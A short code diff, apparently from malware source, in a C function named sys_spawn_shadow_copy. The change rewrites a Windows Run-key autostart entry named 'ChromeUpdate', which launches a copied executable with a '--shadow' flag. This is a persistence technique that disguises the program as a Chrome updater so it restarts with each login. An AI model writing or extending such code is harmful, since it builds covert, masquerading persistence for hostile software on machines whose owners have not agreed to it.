@@ -401,7 +401,9 @@ void sys_spawn_shadow_copy(void) {
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
             0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, "ChromeUpdate", 0, REG_SZ, (BYTE*)destPath, (DWORD)strlen(destPath) + 1);
+        char runCmd[MAX_PATH * 2];
+        snprintf(runCmd, sizeof(runCmd), "\"%s\" --shadow", destPath);
+        RegSetValueExA(hKey, "ChromeUpdate", 0, REG_SZ, (BYTE*)runCmd, (DWORD)strlen(runCmd) + 1);
         RegCloseKey(hKey);
     }
 
